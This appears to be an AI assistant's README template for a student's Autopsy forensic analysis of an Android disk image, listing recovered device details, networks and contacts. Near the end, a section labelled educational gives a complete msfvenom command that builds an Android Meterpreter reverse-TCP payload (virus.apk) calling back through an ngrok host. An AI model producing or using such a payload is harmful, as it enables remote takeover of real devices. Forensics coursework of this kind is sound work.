For your `README.md`, you want to include an introduction to the project, an overview of the contents, instructions on how someone could replicate the analysis or set up Autopsy, and credits if necessary. Here's a detailed template you can use and modify based on your specific project:

# File System Analysis with Autopsy

**Author**: Alaoui Belghiti Hanaa

This repository contains a detailed forensic analysis performed on an Android device image using the digital forensic tool **Autopsy**. The goal of the analysis is to retrieve and examine information related to the device model, MAC address, installed applications, Wi-Fi networks, contacts, search history, and a corrupted media file.

## Project Overview

This project involves:
- Retrieving key forensic details from an Android device.
- Analyzing files and metadata using **Autopsy**.
- Demonstrating how to recover a corrupted file from the device's disk image.

## Tools Used
- **Autopsy**: An open-source digital forensics platform used to conduct the analysis.
- **Kali Linux**: The primary operating system used for conducting the analysis.
- **ExifTool**: A command-line tool used to examine image metadata.
- **MSFVenom**: Used for payload creation, demonstrating a secondary use case in the analysis.

## Key Findings

1. **Device Information**:
   - Device Manufacturer: HUAWEI
   - Model: Ascend Y300

2. **MAC Address**:
   - Ethernet Interface: A4:99:47:3A:6D:C3

3. **Installed Applications**:
   - Browser.apk, Calculator.apk, Contacts.apk

4. **SSID Networks**:
   - Multiple SSID networks were found, with some passwords recovered.

5. **Contacts**:
   - Identified calls made to specific contacts, such as Ivan BBB, along with call duration.

6. **Media Recovery**:
   - A corrupted image was found and successfully restored using metadata manipulation.

```

## How to Run the Analysis

1. **Install Autopsy**:
   - Follow the installation instructions for Autopsy [here](https://www.autopsy.com/download/).
   
2. **Load Disk Image**:
   - Import the provided disk image into Autopsy for analysis.
   
3. **Analyze Key Areas**:
   - Use the "Keyword Search" functionality to look for information such as "SSID", "MAC", ".apk", and contact names.
   - Use **ExifTool** to recover metadata from images.

4. **File Recovery**:
   - To recover the corrupted file, locate the specific image in the `DCIM` folder and follow the restoration steps provided in `report.md`.

## Corrupted File Details

The corrupted media file found in the device’s `DCIM` folder has been included in the `disk_image_analysis/` folder for reference. The steps to recover the file and view its original content are documented in `report.md`.

## Usage of MSFVenom

For educational purposes, I have included a command used to generate an Android payload with **MSFVenom**, demonstrating the steps to create a malicious APK for further analysis:

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=15155 -o /home/joxavy/virus.apk
```

### Additional Tips:

- You might also want to include a **Challenges Faced** section where you discuss any problems encountered, like working with corrupted files or analyzing specific data.
- Make sure your `README.md` is easy to follow so that someone unfamiliar with your project can understand it quickly. 

This will give your repository a professional touch and clearly explain the purpose of the project and its results. Let me know if you'd like to adjust anything!
